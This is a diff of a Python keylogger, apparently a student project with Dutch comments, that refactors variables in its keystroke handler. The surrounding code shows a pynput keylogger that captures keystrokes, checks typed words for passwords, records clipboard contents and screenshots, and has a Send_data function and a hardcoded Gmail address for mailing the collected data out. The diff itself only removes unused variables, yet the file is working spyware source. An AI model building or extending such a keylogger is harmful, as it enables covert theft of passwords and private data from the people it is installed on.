@@ -26,11 +26,9 @@ path_keylog_formatted = re.escape(str(path_keylog))
 
 count = 0
 keys = []
-currentstring = []
-previousstring = []
 
 #Variabelen voor password detection
-
+currentstring = []
 
 # Variabelen voor mail
 email_address = "keylogcasus3@gmail.com"
@@ -49,11 +47,6 @@ path_clipboard = str(path_directory).replace("main.py", "clipboard.txt")
 # Variabelen voor screenshots
 screenshot_info = "screenshot.png"
 path_screenshot = str(path_directory).replace("main.py", "screenshot.png")
-
-# Variabelen voor timer
-iterations = 0
-time = time.time()
-#stop_time = time.time() + time_iteration
 
 #Functies voor screenshot
 
@@ -102,7 +95,7 @@ def Send_data():
 # Functies keylogger
 
 def on_press(key):
-    global count, keys, currentstring, previousstring
+    global count, keys, currentstring
     if key == Key.space or key == Key.enter:
         string = ""
         for i in currentstring:
@@ -110,7 +103,6 @@ def on_press(key):
                 string += str(i)
         print(CheckPass(string))
         currentstring.clear()
-    previousstring.append(key)
     currentstring.append(key)
     keys.append(key)
     count += 1
@@ -121,7 +113,6 @@ def on_press(key):
 
 
 def on_release(key):
-    global currentstring, previousstring
     if key == Key.esc:
         return False
 
